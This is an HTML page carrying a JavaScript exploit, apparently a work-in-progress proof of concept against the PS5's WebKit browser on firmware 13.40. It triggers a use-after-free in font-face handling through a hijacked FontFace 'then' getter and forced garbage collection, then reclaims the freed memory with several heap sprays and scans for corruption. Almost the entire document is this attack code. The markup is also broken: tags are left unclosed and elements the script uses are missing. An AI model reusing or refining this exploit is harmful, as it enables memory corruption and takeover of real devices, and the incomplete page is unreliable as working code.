<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<title>PS5 WebKit Exploit - v3 FW 13.40</title>
<style id="s">

html, body {
  margin: 0; padding: 0; width: 100%; height: 100%;
  background: #050505; color: #fff;

}
#box {
  position: fixed; left: 50%; top: 50%;

<body>
<div id="box">
  <div id="title">PS5 WEBKIT EXPLOIT v3</div>

  <div id="small">FW 13.40 targeted — Multi-bucket heap spray</div>

<canvas id="c" width="512" height="128"></canvas>
<script>
"use strict";

// ============================================================
//  PS5 WebKit Userland Exploit v3
//  Target: FW 13.40 (WebKit 605.1.15 / Safari 17.0 class)
//  Fix: Multi-bucket spray, string heap, pre-spray timing
// ============================================================

const LOG_MAX = 80;
let logLines = [];

function log(msg) {
  const ts = performance.now().toFixed(1);
  const line = `[${ts}] ${msg}`;
  logLines.push(line);
  if (logLines.length > LOG_MAX) logLines.shift();
  const el = document.getElementById("log");
  if (el) el.textContent = logLines.join("\n");
  try { console.log("[exploit] " + msg); } catch(e) {}
}

function showMessage(text, ok) {
  const msg = document.getElementById("msg");
  const title = document.getElementById("title");
  if (msg) msg.textContent = text;
  if (title) {
    title.textContent = ok ? "✅ EXPLOIT SUCCEEDED" : "PS5 WEBKIT EXPLOIT v3";
    title.style.color = ok ? "#00ff60" : "#00ffa0";
  }
}

function showError(text) {
  showMessage("ERROR ❌\n" + text, false);
  const title = document.getElementById("title");
  if (title) title.style.color = "#ff4444";
}

window.onerror = function(message, source, lineno, colno, error) {
  showError(message + "\nLine: " + lineno);
  log("UNCAUGHT: " + message + " @ " + lineno);
};

// ============================================================
//  Firmware Detection
// ============================================================
function detectFirmware() {
  const ua = navigator.userAgent || "";
  let fw = "Unknown";
  let m = ua.match(/PlayStation\s*5\/?\s*([0-9]+(?:\.[0-9]+)?)/i);
  if (!m) m = ua.match(/PlayStation[^0-9]*([0-9]{1,2}\.[0-9]{1,2})/i);
  if (m && m[1]) fw = m[1];
  const el = document.getElementById("fw");
  if (el) el.textContent = "Firmware: " + fw;
  log("UA: " + ua);
  log("FW: " + fw);
  return fw;
}

// ============================================================
//  Heap State
// ============================================================
let sprayFonts = [];
let sprayBuckets = {};   // size -> [ArrayBuffer, ...]
let sprayStrings = [];    // string-based spray
let sprayDOMObjects = []; // DOM-based spray
let keepAlive = [];
let uafTriggered = false;

// ============================================================
//  Style Helpers
// ============================================================
function forceStyle() {
  void document.body.offsetTop;
  void document.documentElement.offsetHeight;
}

function addPads(count) {
  const sheet = document.getElementById("s").sheet;
  for (let i = 0; i < count; i++)
    sheet.insertRule(
      `@font-face { font-family: pad${i}; src: url(nonexistent-pad-${i}.woff); unicode-range: U+E000; }`,
      sheet.cssRules.length
    );
  forceStyle();
  log("Pads: " + count);
}

function addFlushRules(count) {
  const st = document.createElement("style");
  st.id = "flush";
  document.head.appendChild(st);
  const sheet = st.sheet;
  for (let i = 0; i < count; i++)
    sheet.insertRule(
      `@font-face { font-family: flush${i}; src: url(nonexistent-flush-${i}.woff); unicode-range: U+E000; }`,
      sheet.cssRules.length
    );
  forceStyle();
  log("Flush rules: " + count);
}

function deleteFlushRules() {
  const el = document.getElementById("flush");
  if (el && el.sheet) {
    const sheet = el.sheet;
    while (sheet.cssRules.length) sheet.deleteRule(0);
    forceStyle();
    log("Flush rules deleted");
  }
}

function killFontFaceSetCache() {
  const f = new FontFace("cachekill" + keepAlive.length, "local(Helvetica)", {
    unicodeRange: "U+E124"
  });
  document.fonts.add(f);
  keepAlive.push(f);
}

// ============================================================
//  Multi-Bucket Typed Array Spray
//  CSSFontFace on bmalloc could be 64-512 bytes
//  Spray multiple size classes to cover all possibilities
// ============================================================
const BUCKET_SIZES = [
  64, 96, 128, 160, 192, 224, 256,  // common bmalloc bins
  320, 384, 448, 512, 640, 768      // larger bins
];
const SPRAY_PER_BUCKET = 512;
const MARKER_U32 = 0x41414141;
const MARKER2_U32 = 0x43434343;
const MARKER3_U32 = 0x45454545;

function multiBucketSpray() {
  log("Starting multi-bucket spray (" + BUCKET_SIZES.length + " sizes x " + SPRAY_PER_BUCKET + ")...");
  
  for (const size of BUCKET_SIZES) {
    sprayBuckets[size] = [];
    for (let i = 0; i < SPRAY_PER_BUCKET; i++) {
      const buf = new ArrayBuffer(size);
      const view = new DataView(buf);
      
      // Marker pattern at start
      view.setUint32(0, MARKER_U32, true);
      view.setUint32(4, (size << 16) | (i & 0xFFFF), true); // encode bucket+index
      view.setUint32(8, MARKER2_U32, true);
      view.setUint32(12, MARKER3_U32, true);
      
      // Fill body with recognizable pattern
      const tag = 0xDEAD0000 | (size & 0xFFFF);
      for (let off = 16; off < size - 4; off += 4) {
        view.setUint32(off, tag ^ (off & 0xFF), true);
      }
      
      sprayBuckets[size].push({ buffer: buf, view: view, index: i });
    }
  }
  
  let totalBytes = 0;
  for (const size of BUCKET_SIZES) totalBytes += size * SPRAY_PER_BUCKET;
  log("Multi-bucket spray complete: " + totalBytes + " bytes total");
}

// ============================================================
//  String Heap Spray
//  WebKit stores internal strings in a different region
//  Some UAF variants corrupt string references
// ============================================================
function stringSpray() {
  log("Starting string spray...");
  const STR_COUNT = 4096;
  
  for (let i = 0; i < STR_COUNT; i++) {
    // Create strings of varying lengths matching common bmalloc bins
    const len = 32 + (i % 16) * 16; // 32 to 272 chars
    let s = "";
    for (let j = 0; j < len; j++) {
      s += String.fromCharCode(0x41 + (j % 26)); // "AAAA...Z"
    }
    // Tag the string so we can identify it if it shows up corrupted
    const tagged = "TAG" + i.toString(16).padStart(4, "0") + s;
    sprayStrings.push(tagged);
  }
  log("String spray: " + STR_COUNT + " strings");
}

// ============================================================
//  DOM Object Spray
//  CSSFontFace is a renderer object - DOM nodes might share
//  the same heap region in WebKit's rendering pipeline
// ============================================================
function domObjectSpray() {
  log("Starting DOM object spray...");
  const DOM_COUNT = 2048;
  
  for (let i = 0; i < DOM_COUNT; i++) {
    const div = document.createElement("div");
    div.style.cssText = "position:absolute;left:-9999px;top:-9999px;font-family:x;";
    div.setAttribute("data-spray", i.toString(16));
    div.textContent = "AABB"; // Trigger font rendering with our target font
    document.body.appendChild(div);
    sprayDOMObjects.push(div);
  }
  log("DOM spray: " + DOM_COUNT + " elements");
}

// ============================================================
//  Font Face Buffer Spray (for bmalloc reclamation)
// ============================================================
const FONT_B64 = "d09GMgABAAAAAAJkAA4AAAAABiAAAAIQAAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAP0ZGVE0cGhwGYACCQggEEQgKcH0LCgABNgIkAxAEIAWEEAcyGy4FAI7Ctnlz5COJZMsihmWKh4f78Z573/0ZGIXRWLVZpRVNBz5LGmglcIJtH2hFs/L71vRPNg6FnRed2yOwAbJMJfRVCkhVAas6QCnP5701PYAm8AF8l8DegK66cR6mEGHAUS8K8ALFQCjz1m9GpK46tojEaUMI+PLzugVw1L1+g6Pdp10QoNuwKBKBQJW4q4V8mJ9xBx80vlmJDlJLBwDtADhxIz/D0Ya1YYmV/6ZePgIBgAmEBg1GEFgjBEZETYBSgpurYWj/ch78CyBaCUAkEgAQmj1O5W3E/1CCAu1o0I1+AIV5ERBV1dXSU+diLZ3nRV9OPep/9GPyZ/Ej398zrQyAl2Rh7bat/DBuWlu+rt026YeBG7HEWiTBtcafwuPKhODd1XFhmFr73R4rx+1LpKGZyEdolyDIR7hSoJlAAIAqpoBC8R6B0i5BIgS2SAC9niEApAChzzQCqc0uAo0ZFwhQ+vxCgBb9MYlAq744BSGqAxgjjBFIvVbQOKeKMuYfLSaEK7Yai2XguKmauX0HCg5t2NC0aubAChy/qmzUaj+jIBwDp8wtufXYHvxEVgIHtm05wG+yZ2mOGSQNC3Asy+sbTAq/FwbN6yCuJCftLedsSI0DzknNJsNUfOUqnng/9Fzes281/5JpNDqJaw3DWypomi41n5fDXAgJ/L/HCghqKARzIbLt1taqkzUt";

const FONT_BYTES = (() => {
  const s = atob(FONT_B64);
  const bytes = new Uint8Array(s.length);
  for (let i = 0; i < s.length; i++)
    bytes[i] = s.charCodeAt(i);
  return bytes;
})();

function makeFontBuffer() {
  const copy = new Uint8Array(FONT_BYTES.length);
  copy.set(FONT_BYTES);
  return copy.buffer;
}

function fontFaceSpray() {
  const count = 2048;
  for (let i = 0; i < count; i++) {
    const f = new FontFace("BUFRECLAIM_" + i, makeFontBuffer(), {
      unicodeRange: "U+0041"
    });
    sprayFonts.push(f);
  }
  log("FontFace spray: " + count + " faces");
}

// ============================================================
//  Corruption Detection (multi-bucket scan)
// ============================================================
function detectCorruption() {
  log("Scanning all buckets for corruption...");
  let results = [];
  
  for (const size of BUCKET_SIZES) {
    const bucket = sprayBuckets[size];
    for (let i = 0; i < bucket.length; i++) {
      const entry = bucket[i];
      const v = entry.view;
      
      const c0 = v.getUint32(0, true);
      const c8 = v.getUint32(8, true);
      const c12 = v.getUint32(12, true);
      
      if (c0 !== MARKER_U32 || c8 !== MARKER2_U32 || c12 !== MARKER3_U32) {
        // Found corruption! Dump context
        const detail = {
          bucketSize: size,
          index: i,
          markers: {
            offset0: "0x" + c0.toString(16),
            offset8: "0x" + c8.toString(16),
            offset12: "0x" + c12.toString(16)
          }
        };
        
        // Dump first 64 bytes for analysis
        const dump = [];
        const dumpLen = Math.min(64, size);
        for (let off = 0; off < dumpLen; off += 4) {
          dump.push("0x" + v.getUint32(off, true).toString(16).padStart(8, "0"));
        }
        detail.dump = dump.join(" ");
        
        results.push(detail);
        log("CORRUPTED! bucket=" + size + " idx=" + i + 
            " [0]=" + detail.markers.offset0 + 
            " [8]=" + detail.markers.offset8 +
            " [12]=" + detail.markers.offset12);
      }
    }
  }
  
  // Also scan DOM objects for rendered-width anomalies
  for (let i = 0; i < sprayDOMObjects.length; i++) {
    const div = sprayDOMObjects[i];
    const w = div.offsetWidth;
    if (w === 0 || w > 1000) { // abnormal widths
      log("DOM anomaly: idx=" + i + " width=" + w);
      results.push({ domIndex: i, width: w });
    }
  }
  
  return results;
}

// ============================================================
//  String Corruption Scan
// ============================================================
function detectStringCorruption() {
  let anomalies = [];
  for (let i = 0; i < sprayStrings.length; i++) {
    const s = sprayStrings[i];
    // Check if our tag prefix is still intact
    if (!s.startsWith("TAG")) {
      anomalies.push({ index: i, value: s.substring(0, 32) });
      log("String anomaly: idx=" + i + " val=" + s.substring(0, 32));
    }
    // Check length hasn't changed
    const expectedLen = 7 + 32 + (i % 16) * 16; // "TAG" + 4hex + base string
    if (s.length !== expectedLen) {
      anomalies.push({ index: i, expectedLen: expectedLen, gotLen: s.length });
      log("String length anomaly: idx=" + i + " expected=" + expectedLen + " got=" + s.length);
    }
  }
  return anomalies;
}

// ============================================================
//  GC Trigger
//  Force garbage collection to finalize frees
// ============================================================
function forceGC() {
  log("Forcing GC...");
  // WebKit GC heuristics: allocate pressure to trigger collection
  for (let i = 0; i < 8; i++) {
    const tmp = [];
    for (let j = 0; j < 1024; j++) {
      tmp.push(new ArrayBuffer(1024));
    }
    // Let it go out of scope
  }
  // Force finalization
  if (typeof gc === "function") {
    gc();
    log("Explicit gc() called");
  }
}

// ============================================================
//  Main Exploit Flow
// ============================================================
window.onload = () => {
  const fw = detectFirmware();
  
  // FW 13.40 specific params based on your results
  const PAD = 0x30;
  const FLUSH = 0x300;
  
  showMessage("Stage 1/5:\nPre-spray heap...", false);
  
  // PHASE 1: Pre-spray BEFORE the UAF
  // Fill heap regions so the target allocation lands predictably
  multiBucketSpray();
  stringSpray();
  
  showMessage("Stage 2/5:\nFontFace trigger setup...", false);
  
  // PHASE 2: Set up the trigger
  const trigger = new FontFace("trigger", "local(Helvetica)", {
    unicodeRange: "U+0041"
  });
  document.fonts.add(trigger);
  void trigger.loaded;
  
  addPads(PAD);
  addFlushRules(FLUSH);
  
  // PHASE 3: DOM spray - these reference our target font
  // Creating them before the UAF means they hold rendering state
  domObjectSpray();
  
  let fired = false;
  
  showMessage("Stage 3/5:\nWaiting for UAF window...", false);
  
  // Primary trigger
  Object.defineProperty(FontFace.prototype, "then", {
    configurable: true,
    get() {
      if (!fired && this === trigger) {
        fired = true;
        uafTriggered = true;
        log("UAF WINDOW OPEN");
        showMessage("Stage 4/5:\nUAF triggered! Reclaiming...", false);
        
        // === CRITICAL SEQUENCE ===
        // 1. Kill cache
        killFontFaceSetCache();
        
        // 2. Remove target font-face rule (frees CSSFontFace)
        const sheet = document.getElementById("s").sheet;
        sheet.deleteRule(1); // delete 'x' @font-face
        forceStyle();
        
        // 3. Immediately delete flush rules (creates allocation churn)
        deleteFlushRules();
        
        // 4. Force GC to finalize the free
        forceGC();
        
        // 5. RECLAIM: spray into the freed slot
        fontFaceSpray();
        multiBucketSpray();  // second pass - fill any new gaps
        stringSpray();       // second pass
        
        // 6. Force style recalc to trigger use-after-free access
        forceStyle();
        
        // 7. Access DOM objects that reference the freed font
        for (const div of sprayDOMObjects) {
          void div.offsetWidth;  // force layout with potentially freed font
        }
        
        log("Reclamation complete, forced style recalc");
      }
      return undefined;
    }
  });
  
  // Secondary trigger via RAF (fallback)
  let rafCount = 0;
  const rafLoop = () => {
    rafCount++;
    if (!fired && rafCount >= 5) {
      log("RAF fallback trigger at frame " + rafCount);
      try {
        killFontFaceSetCache();
        const sheet = document.getElementById("s").sheet;
        if (sheet && sheet.cssRules.length > 1) {
          sheet.deleteRule(1);
          forceStyle();
          deleteFlushRules();
          forceGC();
          fontFaceSpray();
          multiBucketSpray();
        }
      } catch(e) {
        log("RAF error: " + e.message);
      }
    }
    if (rafCount < 15) requestAnimationFrame(rafLoop);
  };
  requestAnimationFrame(rafLoop);
  
  // Fire the load
  document.fonts.load("1em trigger, x", "AB").then(faces => {
    log("Font load resolved: " + faces.length + " faces");
    keepAlive.push(faces);
    
    showMessage("Stage 5/5:\nScanning for corruption...", false);
    
    // Multiple delayed scans - corruption might not be immediate
    const scanDelays = [500, 1200, 2500, 4000];
    let scanIdx = 0;
    
    function runScan() {
      const delay = scanDelays[scanIdx];
      if (delay === undefined) {
        // All scans done, report final result
        showMessage(
          "PARTIAL ✅\n" +
          "UAF fired but no corruption\n" +
          "detected in spray arrays.\n" +
          "May need different spray\n" +
          "objects for FW 13.40 bmalloc.\n" +
          "Check log for hints.",
          true
        );
        return;
      }
      
      scanIdx++;
      log("Scan pass " + scanIdx + " (delay " + delay + "ms)...");
      
      setTimeout(() => {
        const corrupted = detectCorruption();
        const strAnomalies = detectStringCorruption();
        
        if (corrupted.length > 0) {
          log("HEAP CORRUPTION CONFIRMED!");
          
          // Find the most interesting corruption
          let best = corrupted[0];
          for (const c of corrupted) {
            if (c.dump) {
              log("Dump @ bucket=" + c.bucketSize + " idx=" + c.index + ": " + c.dump);
            }
          }
          
          showMessage(
            "SUCCESS ✅\n" +
            "Heap corruption detected!\n" +
            corrupted.length + " entries corrupted.\n" +
            "Primary bucket: " + best.bucketSize + " bytes\n" +
            "Check log for memory dumps.",
            true
          );
          return; // Stop scanning
        }
        
        if (strAnomalies.length > 0) {
          log("String corruption detected: " + strAnomalies.length + " anomalies");
          showMessage(
            "SUCCESS ✅\n" +
            "String heap corruption!\n" +
            strAnomalies.length + " anomalies found.\n" +
            "Check log for details.",
            true
          );
          return;
        }
        
        log("Scan " + scanIdx + " clean, trying next delay...");
        runScan(); // Try next delay
      }, delay);
    }
    
    runScan();
    
  }, err => {
    log("Font load rejected: " + err);
    showMessage("FAILED ❌\nFont load error:\n" + err, false);
  });
};
</script>
